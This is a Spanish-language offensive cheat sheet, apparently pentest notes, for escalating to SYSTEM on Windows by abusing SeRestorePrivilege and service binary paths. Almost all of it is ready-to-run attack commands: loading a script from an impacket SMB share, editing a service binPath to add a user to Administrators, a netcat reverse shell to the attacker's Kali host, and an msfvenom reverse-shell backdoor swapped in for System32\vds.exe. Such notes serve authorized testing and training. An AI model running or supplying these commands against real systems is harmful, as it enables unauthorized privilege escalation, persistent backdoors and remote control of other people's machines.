Restore

Restore Permite acceso de escritura a System32 y reemplazar cualquier fichero de servicio

Habilitar Privilegio

EnableSeRestorePrivilege.ps1: Habilitar Privilegio en caso de estar deshabilitado

Habilitar SeRestorePrivilege en caso de estar deshabilitado

# Kali: SMB Server en el directorio de EnableSeRestore.ps1
impacket-smbserver recurso $(pwd) -smb2support
# Windows: Habilitar RestorePrivilege
\\<kali_ip>\recurso\EnableSeRestorePrivilege.ps1

Buscar Servicios

CMD: Buscar Servicios Privilegiados -> SERVICE_START_NAME: LocalSystem

# Listar Servicios
services # PowerShell
wmic service list brief # CMD
# Información sobre un servicio
sc.exe qc <service_name>

Editar Path

CMD: Editar BINARY_PATH_NAME para ejecutar un comando

# Payload 1: Agregar nuestro usuario a administrators.
# A veces hay que coger username completo del comando whoami Ej. <hostname>\<username>
sc.exe config <service_name> binPath= "cmd /c net localgroup Administrators <username> /add"

# Payload 2: Subir nc.exe y mandarnos rev_shell a un listener
sc.exe config <service_name> binPath= "C:\Users\<user>\nc.exe -e cmd <kali_ip> 443"
rlwrap nc 443

# Payload 3: Sustituir binario de BinaryPath C:\Windows\System32\vds.exe -> backdoor.exe
# Kali
msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > backdoor.exe
rlwrap nc 443
# PowerShell
mv C:\Windows\System32\vds.exe C:\Windows\System32\vds.back
mv backdoor.exe C:\Windows\System32\vds.exe

Reiniciar Servicio

CMD: Reiniciar el servicio. Se debe producir un fallo al reiniciar

sc.exe stop <service_name>
net stop <service_name> # Alternativa
sc.exe start <service_name>
net start <service_name> # Alternativa

CMD: Confirmar ADMINS

net localgroup Administrators
# Si somos del grupo Administrators pero no tenemos aún privilegios reinicia la shell
# Si el payload depende de una rev_shell -> Kali: Listener
